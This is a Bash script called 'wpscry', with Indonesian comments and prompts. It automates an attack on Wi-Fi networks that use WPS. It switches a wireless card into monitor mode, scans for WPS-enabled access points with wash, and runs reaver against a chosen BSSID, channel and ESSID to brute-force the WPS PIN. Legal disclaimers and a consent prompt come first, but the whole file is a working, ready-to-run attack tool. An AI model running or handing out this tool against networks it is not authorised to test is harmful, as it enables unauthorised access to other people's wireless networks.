#!/bin/bash
#---------------------------------------------------------------------------------------------------------------------
#  __        __  ____    ____     ____   ____   __   __
#  \ \      / / |  _ \  / ___|   / ___| |  _ \  \ \ / /
#   \ \ /\ / /  | |_) | \___ \  | |     | |_) |  \ V / 
#    \ V  V /   |  __/   ___) | | |___  |  _ <    | |  
#     \_/\_/    |_|     |____/   \____| |_| \_\   |_| 
#---------------------------------------------------------------------------------------------------------------------
# [+] wpscry
#     wpscry adalah sebuah script Bash sederhana yang dirancang untuk melakukan serangan otomatis terhadap jaringan Wi-Fi yang menggunakan fitur WPS (Wi-Fi Protected Setup) dengan alat reaver.
#
# [+] Peringatan:
#     1. Legalitas: Menggunakan script ini untuk mengakses atau menyerang jaringan Wi-Fi tanpa izin eksplisit dari pemiliknya adalah ilegal dan melanggar hukum di banyak negara. Pastikan Anda hanya menggunakan script ini pada jaringan yang Anda miliki atau untuk tujuan yang sah dan dengan izin.
#     2. Kepatuhan Hukum: Anda bertanggung jawab untuk mematuhi semua hukum dan peraturan yang berlaku di negara Anda terkait dengan akses dan keamanan jaringan.
#     3. Etika Profesional: Gunakan script ini dengan etika profesional dan hanya dalam lingkungan yang sesuai seperti laboratorium keamanan siber atau simulasi yang disetujui.
#     4. Tanggung Jawab: Penggunaan script ini dilakukan sepenuhnya atas risiko Anda sendiri. Pembuat script ini tidak bertanggung jawab atas penggunaan yang melanggar hukum atau dampak negatif lainnya.
#
# [+] Pembuat
#     - Ropay
# 
# [+] Github
#     https://github.com/bgropay/bash4hacking.git
#
# [+] Daftar alat yang diperlukan:
#     - airmon-ng
#     - iwconfig
#     - wash
#     - reaver
#
# [+]  Cara menjalankannya:
#      1. chmod +x wpscry.sh
#      2. ./wpscry.sh
#---------------------------------------------------------------------------------------------------------------------

# Fungsi untuk mengecek root.
function cek_root(){
	if [[ "$EUID" -ne 0 ]]; then
		echo "[-] Script ini harus dijalankan sebagi root."
		exit
	fi
}

# Fungsi untuk mengecek alat yang diperlukan oleh wpscry.
function cek_alat(){

        daftar_alat_belum_terinstal=()

        daftar_alat=(
	        "reaver"
	        "wash"
	        "airmon-ng" 
	        "iwconfig"
	)

        for cek_alat in "${daftar_alat[@]}"; do
                if ! command -v "${cek_alat}" >> /dev/null 2>&1; then 
                        daftar_alat_belum_terinstal+=("${cek_alat}")
                fi
        done

        if [[ "${#daftar_alat_belum_terinstal[@]}" -ne 0  ]]; then
	       echo "[-] Script ini tidak dapat dijalankan, karena ada alat yang belum terinstal."
	       echo ""
	       echo "Alat:"
	
               for alat_belum_terinstal in "${daftar_alat_belum_terinstal[@]}"; do
                       echo "- ${alat_belum_terinstal}"
	       done
	       exit 1
        fi
        
}

# Fungsi untuk membuat folder 'sesi' untuk menyimpan sesi dari alat reaver.
function buat_folder(){
        nama_folder="sesi"
	if [[ ! -d "${nama_folder}" ]]; then
                mkdir -p "${nama_folder}"
		chmod 755 "${nama_folder}"
        fi
}

# Fungsi untuk menampilkan peringatan 
function peringatan(){
        # Kata-kata peringatan 
        clear
        echo "PERINGATAN:"
        echo ""
        echo "Script ini hanya untuk tujuan pendidikan dan pengujian keamanan. Menggunakan script ini untuk mengakses atau"
        echo "menyerang jaringan Wi-Fi tanpa izin eksplisit dari pemiliknya adalah ilegal dan melanggar hukum di banyak"
        echo "negara. Pengguna bertanggung jawab penuh atas segala konsekuensi dari penggunaan script ini."
        echo ""
        echo "Dengan menggunakan script ini, Anda menyetujui:"
        echo ""
        echo "1. Menggunakan hanya pada jaringan yang Anda miliki atau dengan izin eksplisit dari pemiliknya."
        echo "2. Tidak menggunakan script ini untuk tujuan ilegal atau tidak etis."
        echo "3. Mematuhi semua hukum dan peraturan yang berlaku terkait dengan akses dan keamanan jaringan."
        echo "4. Bertanggung jawab penuh atas semua tindakan yang Anda lakukan menggunakan script ini, termasuk kerusakan yang"
        echo "   mungkin timbul pada jaringan atau data."
        echo ""
        echo "Jika Anda tidak menyetujui ketentuan ini, harap segera keluar dan tidak menggunakan script ini. Penggunaan script"
        echo "ini berarti Anda telah membaca, memahami, dan menyetujui semua ketentuan di atas."
        echo ""

        # Nanya apakah mau menggunakan script atau tidak.
	while true; do
                read -p "Apakah Anda ingin melanjutkannya (iya/tidak): " nanya
		if [[ "${nanya}" == "iya" ]]; then
                        break
		elif [[ "${nanya}" == "tidak" ]]; then
                        exit 0
                else
		        echo "[-] Masukkan tidak valid. Harap masukkan'iya' atau'tidak'."
                        continue
                fi
        done
}

# Fungsi untuk mengatur interface yang ingin digunakan.
function mengatur_interface(){
        clear
	echo "Selamat datang di wpscry!"
        echo ""
	while true; do
		read -p "Interface: " interface
		if [[ ! -z "${interface}" ]]; then
			if ip link show | grep -q -w "${interface}"; then
				echo "[+] Interface ${interface} ditemukan."
				break
			else
				echo "[-] Interface ${interface} tidak ditemukan."
				continue
			fi
		else
			echo "[-] Interface tidak boleh kosong."
			continue
		fi
	done
}

# Fungsi untuk mengaktifkan mode monitor pada interface yang sudah diatur.
function mengaktifkan_mode_monitor(){
		if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
			echo "[+] Interface ${interface} sudah dalam mode monitor."
		else
			echo "[-] Interface ${interface} belum dalam mode monitor."
			echo "[*] Mengaktifkan mode monitor pada interface ${interface}..."
			airmon-ng check kill >> /dev/null 2>&1
			airmon-ng start "${interface}" >> /dev/null 2>&1
			if ip link show | grep -q -w  "${interface}mon"; then
				interface="${interface}mon"
			else
				interface="${interface}"
			fi

		fi

		if ip link show | grep -q -w "${interface}"; then
			if iwconfig "${interface}" 2>/dev/null | grep -q -w "Mode:Monitor"; then
				echo "[+] Berhasil mengaktifkan mode monitor pada interface ${interface}."
			else
				echo "[-] Gagal mengaktifkan mode monitor pada interface ${interface}."
				exit 1
			fi

		fi
		
}

# Fungsi untuk memindai jaringan wps menggunakan alat wash.
function memindai_jaringan_wps(){
	echo "[*] Memindai jaringan WPS (Tekan CTRL+C untuk menghentikan pemindaian)..."
	echo ""
	wash -i "${interface}"
}

# Fungsi untuk mengatur target yang ingin di serang.
function mengatur_target(){

	# Mengatur ESSID target
	while true; do
		read -p "ESSID: " essid
		if [[ ! -z "${essid}" ]]; then
			echo "[+] ${p}ESSID: '${essid}'"
			break
		else
			echo "[-] ESSID tidak boleh kosong."
			continue
		fi
	done

	# Mengatur BSIID target
	while  true; do
		read -p "BSSID: " bssid
		if [[ ! -z "${bssid}" ]]; then
			if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$ ]]; then
				echo "[+] BSSID: '${bssid}'"
				break
			else
				echo "[-] BSSID tidak valid."
				continue
			fi
		else
			echo "[-] BSSID tidak boleh kososng."
			continue
		fi
	done

	# Mengatur channel target
	while true; do
		read -p "Channel: " channel
		if [[ ! -z "${channel}" ]]; then
			if [[ "${channel}" =~ ^[0-9]+$ ]]; then
				echo "[+] Channel: '${channel}'"
				break
			else
				echo "[-] Channel tidak valid."
				continue
			fi
		else
			echo "[-] Channel tidak boleh kosong."
			continue
		fi
	done
	read -p "Tekan [Enter] untuk memulai serangan..."
}

# Fungsi untuk melakukan serangan terhadap target yang sudah diatur.
function menjalankan_serangan(){
        waktu=$(date "+%d-%m-%Y_%H:%M:%S")
        sesi="${nama_folder}/${essid}_${waktu}.session"
	reaver -i "${interface}" -c "${channel}" -b "${bssid}" -e "${essid}" -s "${sesi}" -v
        #
        # Keterangan:
	#
	# -i   : Menentukan interface jaringan yang akan digunakan (misalnya, wlan0).
        # -c   : Menentukan saluran (channel) jaringan Wi-Fi yang akan diserang.
	# -b   : Menentukan bssid (alamat MAC) dari router atau access point yang akan diserang.
        # -e   : Menentukan ESSID (nama jaringan Wi-Fi) dari jaringan yang akan diserang.
	# -s   : Menentukan file sesi yang digunakan untuk menyimpan atau melanjutkan serangan.
	# -v   : Menambahkan tingkat verbositas (verbosity) untuk output yang lebih detail selama serangan.
}

# Fungsi untuk menonaktifkan mode monitor pada interface yang sudah diatur.
function menonaktifkan_mode_monitor(){
        airmon-ng stop "${interface}" >> /dev/null 2>&1
	systemctl restart NetworkManager
        exit 0
}

# Fungsi utama wpscry.
function wpscry(){
        # Memanggil fungsi cek_root.
	cek_root
        # Memanggil fungsi cek_alat.
        cek_alat
	# Memanggil fungsi buat_folder.
        buat_folder
	# Memanggil fungsi peringatan 
	peringatan
	# Memanggil fungsi mengatur_interface.
	mengatur_interface
        # Memanggil fungsi mengaktifkan_mode_monitor.
	mengaktifkan_mode_monitor
        # Memanggil fungsi memindai_jaringan_wps.
	memindai_jaringan_wps
        # Memanggil fungsi mengatur_target.
	mengatur_target
        # Memanggil fungsi menjalankan_serangan.
	menjalankan_serangan
        # Memanggil fungsi menonaktifkan_mode_monitor.
        menonaktifkan_mode_monitor
}

# Memanggil fungsi wpscry.
wpscry
